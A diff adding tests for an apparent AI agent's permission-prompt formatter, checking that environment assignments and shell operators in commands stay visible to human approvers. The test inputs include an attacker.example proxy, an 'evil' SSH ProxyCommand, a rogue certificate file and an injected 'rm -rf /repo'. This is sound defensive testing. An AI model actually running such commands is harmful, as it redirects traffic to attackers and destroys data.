@@ -757,6 +757,132 @@ describe('permission interaction', () => {
     expect(text).not.toContain('simple_expansion');
   });
 
+  it('collapses leading runtime environment assignments in command prompts and receipts', () => {
+    const request = {
+      ...requestWithSuggestions([]),
+      toolName: 'RunCommand',
+      toolInput: {
+        command:
+          "GODEBUG=netdns=go HTTP_PROXY='http://127.0.0.1:18790/' HTTPS_PROXY='http://127.0.0.1:18790/' NODE_USE_ENV_PROXY='1' NO_PROXY='127.0.0.1,localhost,::1' gantry credentials --help > /tmp/gantry-help.txt",
+      },
+    } satisfies PermissionApprovalRequest;
+
+    const text = formatPermissionPromptText(request, 60_000);
+
+    expect(text).toContain('Command:\n```\ngantry credentials --help');
+    expect(text).toContain('Runtime environment: GODEBUG=netdns=go');
+    expect(text).toContain("HTTP_PROXY='http://127.0.0.1:18790/'");
+    expect(text).toContain("NODE_USE_ENV_PROXY='1'");
+    expect(text).toContain('Redirect: > /tmp/gantry-help.txt');
+
+    const receipt = formatPermissionReceiptText('permission_123', request, {
+      approved: true,
+      mode: 'allow_once',
+      decidedBy: 'ravi',
+    });
+    expect(receipt).toContain(
+      "Allowed once: Command (GODEBUG=netdns=go HTTP_PROXY='http://127.0.0.1:18790/' HTTPS_PROXY='http://127.0.0.1:18790/' NODE_USE_ENV_PROXY='1' NO_PROXY='127.0.0.1,localhost,::1' gantry credentials --help > /tmp/gantry-help.txt). The agent will continue this request.",
+    );
+  });
+
+  it('keeps user-provided command environment assignments visible', () => {
+    const text = formatPermissionPromptText(
+      {
+        ...requestWithSuggestions([]),
+        toolName: 'Bash',
+        toolInput: {
+          command: 'FEATURE_FLAG=1 npm test',
+        },
+      },
+      60_000,
+    );
+
+    expect(text).toContain('FEATURE_FLAG=1 npm test');
+    expect(text).not.toContain('Runtime environment:');
+  });
+
+  it('keeps user-provided runtime-key environment assignments visible', () => {
+    const text = formatPermissionPromptText(
+      {
+        ...requestWithSuggestions([]),
+        toolName: 'Bash',
+        toolInput: {
+          command:
+            "HTTP_PROXY='http://attacker.example:8080' GIT_SSH_COMMAND='ssh -o ProxyCommand=evil' git clone https://example.com/repo.git",
+        },
+      },
+      60_000,
+    );
+
+    expect(text).toContain("HTTP_PROXY='http://attacker.example:8080'");
+    expect(text).toContain("GIT_SSH_COMMAND='ssh -o ProxyCommand=evil'");
+    expect(text).toContain(
+      "Runtime environment: HTTP_PROXY='http://attacker.example:8080' GIT_SSH_COMMAND='ssh -o ProxyCommand=evil'",
+    );
+  });
+
+  it('keeps TLS trust environment assignments visible', () => {
+    const text = formatPermissionPromptText(
+      {
+        ...requestWithSuggestions([]),
+        toolName: 'Bash',
+        toolInput: {
+          command: 'SSL_CERT_FILE=/tmp/gantry-evil.pem git clone repo',
+        },
+      },
+      60_000,
+    );
+
+    expect(text).toContain('SSL_CERT_FILE=/tmp/gantry-evil.pem git clone repo');
+    expect(text).not.toContain('Runtime environment:');
+  });
+
+  it('keeps runtime environment assignments visible for generated skill action commands', () => {
+    const request = {
+      ...requestWithSuggestions([]),
+      toolName: 'RunCommand',
+      toolInput: {
+        command:
+          "HTTP_PROXY='http://127.0.0.1:8888/' /tmp/.llm-runtime/claude/skills/demo/action.sh",
+      },
+    } satisfies PermissionApprovalRequest;
+
+    const text = formatPermissionPromptText(request, 60_000);
+
+    expect(text).toContain(
+      'Command: generated skill action command; runtime path hidden.',
+    );
+    expect(text).toContain('Action: skills/demo/action.sh');
+    expect(text).toContain(
+      "Runtime environment: HTTP_PROXY='http://127.0.0.1:8888/'",
+    );
+    expect(
+      formatPermissionReceiptText('permission_123', request, {
+        approved: true,
+        mode: 'allow_once',
+        decidedBy: 'ravi',
+      }),
+    ).toContain(
+      "Selected skill action (skills/demo/action.sh; env: HTTP_PROXY='http://127.0.0.1:8888/')",
+    );
+  });
+
+  it('keeps shell control operators in the visible command after env assignments', () => {
+    const text = formatPermissionPromptText(
+      {
+        ...requestWithSuggestions([]),
+        toolName: 'Bash',
+        toolInput: {
+          command: 'GIT_SSH_COMMAND=ssh;rm -rf /repo git clone repo',
+        },
+      },
+      60_000,
+    );
+
+    expect(text).toContain('Runtime environment: GIT_SSH_COMMAND=ssh');
+    expect(text).toContain(';rm -rf /repo git clone repo');
+  });
+
   it('hides Bash commands with secrets in permission prompt previews', () => {
     const text = formatPermissionPromptText(
       {
